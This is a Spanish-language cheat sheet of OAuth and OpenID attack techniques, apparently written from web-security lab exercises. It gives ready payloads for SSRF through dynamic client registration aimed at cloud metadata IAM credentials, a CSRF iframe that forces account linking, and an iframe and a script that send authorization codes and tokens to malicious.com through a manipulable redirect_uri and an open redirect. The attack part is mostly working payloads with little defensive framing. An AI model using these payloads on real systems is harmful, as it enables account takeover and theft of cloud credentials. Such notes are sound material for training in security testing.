- -- 
### **1. Probar a la hora de loguearse si se genera un token en algun momento y reutilizarlo para acceder a otro perfil**

### **2. SSRF vía registro dinámico de cliente OpenID**
- Si esta habilitado el **`.well-known/openid-configuration`** se puede ver si esta expuesto el **`/reg`** con el fin de registrar una nueva "aplicacion cliente" poniendo como direccion de logo una direccion url y asi generar un SSRF.
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json
Content-Length: 193

{
     "redirect_uris": [
         "https://e8nzsb0arhff60v8ucb46qfdq4wvks8h.oastify.com"
        ],
	"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

### **3. Forzado de enlace entre perfiles OAuth**
- El sitio web ofrece la posibilidad de enlazar un perfil social a una cuenta local ya existente, permitiendo así que el usuario pueda autenticarse mediante OAuth en el futuro. El problema es que esta vinculación no está protegida contra ataques CSRF: el endpoint ‘/oauth-linking?code=…‘ no valida si el código de autorización fue solicitado por el mismo usuario que va a asociar la cuenta.

- El atacante completa el flujo de autorización con su propia cuenta social, pero intercepta y guarda el enlace final que contiene el código de autorización. Luego, construye un exploit HTML que contiene un iframe apuntando a dicho enlace, y lo envía al administrador mediante el exploit server. Como el administrador tiene una sesión activa en la web, su navegador realiza la petición al endpoint de vinculación, usando el código robado del atacante y asociando su cuenta social con la cuenta del administrador.
```html
<iframe src="https://domain.com/oauth-linking?code=g7HjNPOn9tcLtpraL53RgDt5w6Dt5TrxrKf17S4YKq9"></iframe>
```

### **4. Secuestro de cuenta por `redirect_uri` en OAuth**
- el código de autorización (code) es enviado como parámetro en una redirección tras la autenticación. Sin embargo, nota que puede modificar el redirect_uri por cualquier dominio, y el servidor OAuth lo acepta sin validación alguna. Esto le permite redirigir el código de autorización hacia un servidor controlado por él
```html
<iframe src="https://oauth-server.com/auth?client_id=${id}&redirect_uri=https://malicious.com/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
```

### **5. Robo de token OAuth con redirección abierta**

```html
<script>

if(!window.location.hash){
	window.location = 'https://oauth-server.com/auth?client_id=${id}&redirect_uri=https://domain.com/oauth-callback/../post/next?path=https://malicious.com&response_type=token&nonce=-1580402590&scope=openid%20profile%20email'
} else {
	window.location = '/?' + window.location.hash.substr(1)
}

</script>
```